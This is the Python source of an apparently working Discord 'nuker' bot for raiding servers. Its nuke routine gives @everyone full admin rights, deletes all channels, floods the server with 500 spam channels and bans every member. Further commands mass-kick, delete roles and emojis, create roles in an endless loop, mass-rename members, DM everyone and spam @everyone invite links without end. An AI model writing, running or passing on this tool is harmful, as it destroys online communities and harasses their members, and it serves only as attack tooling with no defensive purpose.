import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
from colorama import Fore, init 
import os 
import json



token =  ("your bot token")


bot = commands.Bot(command_prefix="w", intents=discord.Intents.all())

bot.remove_command("help")

spam_messages = ["@everyone Solar X Xans Runs You https://discord.gg/14/37", "@everyone Solar Runs You https://discord.gg/1437"]
channel_names = ["Hugged-By-Solar🤗","Hugged-By-Solar🤗","Hugged-By-Solar🤗","Hugged-By-Solar🤗"]
webhook_usernames = ["Solar runs you","Solar is asian","Solar is pro nucker","4ixty is cute"]

nuke_on_join = False
nuke_wait_time = 0

CHANNEL_NAMES = ["Hugged-By-Solar🤗","Hugged-By-Solar🤗", "Hugged-By-Solar🤗, Hugged-By-Solar🤗"]
MESSAGE_CONTENTS = ["@everyone Solar X Xans Runs You  https://discord.gg/xans "]


@bot.event
async def on_ready():
  print(f'''

{Fore.MAGENTA}  ██████  ▒█████   ██▓    ▄▄▄       ██▀███  
{Fore.MAGENTA}▒██    ▒ ▒██▒  ██▒▓██▒   ▒████▄    ▓██ ▒ ██▒
{Fore.MAGENTA}░ ▓██▄   ▒██░  ██▒▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒
{Fore.MAGENTA}  ▒   ██▒▒██   ██░▒██░   ░██▄▄▄▄██ ▒██▀▀█▄  
{Fore.MAGENTA}▒██████▒▒░ ████▓▒░░██████▒▓█   ▓██▒░██▓ ▒██▒
{Fore.MAGENTA}▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░
{Fore.MAGENTA}░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░
{Fore.MAGENTA}░  ░  ░  ░ ░ ░ ▒    ░ ░    ░   ▒     ░░   ░ 
{Fore.MAGENTA}      ░      ░ ░      ░  ░     ░  ░   ░     
                                        

{Fore.YELLOW}CODED BY REJECT#8300
    ''')
  print('Logged in as {}'.format(bot.user.name))
  activity = discord.Game(name="Giving You Hugs :)", type=3)
  await bot.change_presence(status=discord.Status.idle, activity=activity)
  print("Ready")


async def nuke(guild):
  print(f"{C.YELLOW}Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}Successfully granted admin permissions in {C.YELLOW}{guild.name}")
  except:
    print(f"{C.RED}Admin permissions NOT GRANTED in {C.YELLOW}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  for user in list(guild.members):
      try:
        await guild.ban(user)
        print (f"{user.name} has been banned from {guild.name}")
      except:
        print (f"{user.name} has FAILED to be banned from {guild.name}")
        print ("Action Completed: Banned")
      print(f"{C.GREEN}Nuked {guild.name}.")

@bot.command()
async def w(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return

@bot.command()
async def s(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Sall Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass


@bot.command()
async def d(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def c(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="appa-is-cute")

@bot.command()
async def a(ctx):
 for i in range(100):
    guild = ctx.guild
    await guild.create_text_channel(random.choice(channel_names))



@bot.command()
async def k(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"Pong! My latency is {round(bot.latency *100)}ms.")
  

@bot.event
async def on_guild_channel_create(channel):
    while True:
      await channel.send(random.choice(spam_messages))
      
       

@bot.command()
async def b(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: Banned") 
                

@bot.command()
async def e(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def massnick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick="Barnacle Nibber Claus")
                print (f"{user.name} has been renamed")
            except:
                print (f"{user.name} has NOT been renamed")
        print ("Action Completed: massnick change")

@bot.command()
async def dmall(ctx, *, args = None):
        await ctx.message.delete()
        members = ctx.guild.members
        for member in members:
            try:
                await member.send(args)
                print("sent " + args + " to " + member.name)

            except:
                print("didnt send " + args + " to " + member.name)

@bot.command(pass_contex=True)
async def y(ctx, amount: int, *, message):
  await ctx.message.delete()
  for _i in range(amount):
      await ctx.send(message)
       

bot.run(token, bot=True)
